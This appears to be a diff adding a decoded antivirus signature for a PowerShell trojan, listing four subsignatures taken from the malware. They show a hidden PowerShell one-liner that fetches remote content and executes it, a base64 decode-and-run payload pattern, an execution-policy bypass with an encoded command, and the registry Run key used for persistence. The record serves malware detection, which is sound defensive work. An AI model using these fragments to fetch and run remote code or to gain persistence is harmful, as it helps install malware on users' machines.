@@ -1,0 +1,23 @@
+VIRUS NAME: Ps1.Trojan.Agent-10059932-0
+TDB: Engine:90-255,Target:7
+LOGICAL EXPRESSION: 0&1&2&3
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: ASCII WIDE NOCASE
+ +-> DECODED SUBSIGNATURE:
+= "start /min powershell -w h -c " + """" + "& ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -UseBasicParsing -Uri '" + $url + "' -Method POST -Body 'packages.npm.org/product1').Content))) '" + $url + "'"""
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: ASCII WIDE NOCASE
+ +-> DECODED SUBSIGNATURE:
+$cmd = ("`$payload=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$payloadEnc')); "+"`$param=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$paramEnc')); "+"`$sb=[ScriptBlock]::Create(`$payload); "+'& '+"`$sb "+"`$param")
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: ASCII WIDE NOCASE
+ +-> DECODED SUBSIGNATURE:
+Do-Run-Scpt -cmdline "-NoProfile -ep Bypass -EncodedCommand $enc"
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: ASCII WIDE NOCASE
+ +-> DECODED SUBSIGNATURE:
+$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
